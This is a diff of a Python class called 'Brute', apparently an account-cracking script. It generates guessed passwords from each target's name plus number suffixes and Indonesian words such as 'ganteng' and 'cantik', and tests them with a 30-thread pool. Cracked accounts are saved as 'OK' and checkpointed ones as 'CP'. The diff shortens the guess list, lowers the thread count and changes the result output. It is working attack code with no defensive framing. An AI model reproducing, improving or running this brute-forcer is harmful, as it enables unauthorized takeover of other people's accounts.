@@ -85,103 +85,44 @@ class Brute:
 				if len(obj) == 1:
 					listpass = [
 						obj[0]+'123', obj[0]+'1234',
-						obj[0]+'12345', obj[0]+'123456', 
-      obj[0]+'1234567', obj[0]+'12345678',
-      obj[0]+'123456789',
-      obj[0]+'ganteng123', obj[0]+'ganteng1234',
-      obj[0]+'ganteng12345',
-      obj[0]+'cantik123', obj[0]+'cantik1234',
-      obj[0]+'cantik12345',
-      obj[0]+'tampan123', obj[0]+'cantik1234',
-      obj[0]+'cantik12345',
+						obj[0]+'12345',
+      
 					]
 				elif len(obj) == 2:
 					listpass = [
 						obj[0]+'123', obj[0]+'1234',
-						obj[0]+'12345', obj[0]+'123456', 
-      obj[0]+'1234567', obj[0]+'12345678',
-      obj[0]+'123456789',
-      obj[0]+'ganteng123', obj[0]+'ganteng1234', 
-      obj[0]+'ganteng12345',
-      obj[0]+'cantik123', obj[0]+'cantik1234',
-      obj[0]+'cantik12345',
+						obj[0]+'12345',
+      
 						obj[1]+'123', obj[1]+'1234',
-      obj[1]+'12345', obj[1]+'123456', 
-      obj[1]+'1234567', obj[1]+'12345678',
-      obj[1]+'123456789',
-      obj[1]+'ganteng123', obj[1]+'ganteng1234',
-      obj[1]+'ganteng123', obj[1]+'ganteng1234', 
-      obj[1]+'ganteng12345',
-      obj[1]+'cantik123', obj[1]+'cantik1234',
-      obj[1]+'cantik12345',
+      obj[1]+'12345',
+      
 					]
 				elif len(obj) == 3:
 					listpass = [
 						obj[0]+'123', obj[0]+'1234',
-						obj[0]+'12345', obj[0]+'123456', 
-      obj[0]+'1234567', obj[0]+'12345678',
-      obj[0]+'123456789',
-      obj[0]+'ganteng123', obj[0]+'ganteng1234', 
-      obj[0]+'ganteng12345',
-      obj[0]+'cantik123', obj[0]+'cantik1234',
-      obj[0]+'cantik12345',
+						obj[0]+'12345',
+      
 						obj[1]+'123', obj[1]+'1234',
-      obj[1]+'12345', obj[1]+'123456', 
-      obj[1]+'1234567', obj[1]+'12345678',
-      obj[1]+'123456789',
-      obj[1]+'ganteng123', obj[1]+'ganteng1234',
-      obj[1]+'ganteng123', obj[1]+'ganteng1234', 
-      obj[1]+'ganteng12345',
-      obj[1]+'cantik123', obj[1]+'cantik1234',
-      obj[1]+'cantik12345',
+      obj[1]+'12345',
+      
 						obj[2]+'123', obj[2]+'1234',
-      obj[2]+'12345', obj[2]+'123456', 
-      obj[2]+'1234567', obj[2]+'12345678',
-      obj[2]+'123456789',
-      obj[2]+'ganteng123', obj[2]+'ganteng1234',
-      obj[2]+'ganteng123', obj[2]+'ganteng1234', 
-      obj[2]+'ganteng12345',
-      obj[2]+'cantik123', obj[2]+'cantik1234',
-      obj[2]+'cantik12345',
+      obj[2]+'12345', 
+      
 					]
 				elif len(obj) == 4:
 					listpass = [
 						obj[0]+'123', obj[0]+'1234',
-						obj[0]+'12345', obj[0]+'123456', 
-      obj[0]+'1234567', obj[0]+'12345678',
-      obj[0]+'123456789',
-      obj[0]+'ganteng123', obj[0]+'ganteng1234', 
-      obj[0]+'ganteng12345',
-      obj[0]+'cantik123', obj[0]+'cantik1234',
-      obj[0]+'cantik12345',
+						obj[0]+'12345',
+      
 						obj[1]+'123', obj[1]+'1234',
-      obj[1]+'12345', obj[1]+'123456', 
-      obj[1]+'1234567', obj[1]+'12345678',
-      obj[1]+'123456789',
-      obj[1]+'ganteng123', obj[1]+'ganteng1234',
-      obj[1]+'ganteng123', obj[1]+'ganteng1234', 
-      obj[1]+'ganteng12345',
-      obj[1]+'cantik123', obj[1]+'cantik1234',
-      obj[1]+'cantik12345',
+      obj[1]+'12345',
+      
 						obj[2]+'123', obj[2]+'1234',
-      obj[2]+'12345', obj[2]+'123456', 
-      obj[2]+'1234567', obj[2]+'12345678',
-      obj[2]+'123456789',
-      obj[2]+'12345678', obj[2]+'123456789',
-      obj[2]+'ganteng123', obj[2]+'ganteng1234',
-      obj[2]+'ganteng123', obj[2]+'ganteng1234', 
-      obj[2]+'ganteng12345',
-      obj[2]+'cantik123', obj[2]+'cantik1234',
-      obj[2]+'cantik12345',
+      obj[2]+'12345', 
+      
 						obj[3]+'123', obj[3]+'1234',
-      obj[3]+'12345', obj[3]+'123456', 
-      obj[3]+'1234567', obj[3]+'12345678',
-      obj[3]+'123456789',
-      obj[3]+'ganteng123', obj[3]+'ganteng1234',
-      obj[3]+'ganteng123', obj[3]+'ganteng1234', 
-      obj[3]+'ganteng12345',
-      obj[3]+'cantik123', obj[3]+'cantik1234',
-      obj[3]+'cantik12345',
+      obj[3]+'12345', 
+      
 					]
 				else:
 					listpass = [
@@ -202,18 +143,18 @@ class Brute:
 				if self.setpw[0] != '':
 					break
 				
-		th(100).map(self.brute, self.target)
+		th(30).map(self.brute, self.target)
 		self.results()
 		exit()
 
 	def results(self):
 		if (len(self.ok) != 0):
 			print('\n\nOK: '+str(len(self.ok)))
-			for i in self.ok: print('\033[0;92m### ' +str(i)+'\033[0m')
+			for i in self.ok: print('\033[0;92m' +str(i)+'\033[0m')
 			print('Your OK results saved in: out/ok.txt')
 		if (len(self.cp) != 0):
 			print('\n\nCP: '+str(len(self.cp)))
-			for i in self.cp: print('\033[0;93m### '+str(i)+'\033[0m')
+			for i in self.cp: print('\033[0;93m'+str(i)+'\033[0m')
 			print('Your CP results saved in: out/cp.txt')
 		if (len(self.cp) == 0 and len(self.ok) == 0):
 			print('\n\n033[0;91mNo results found :(\033[0m')
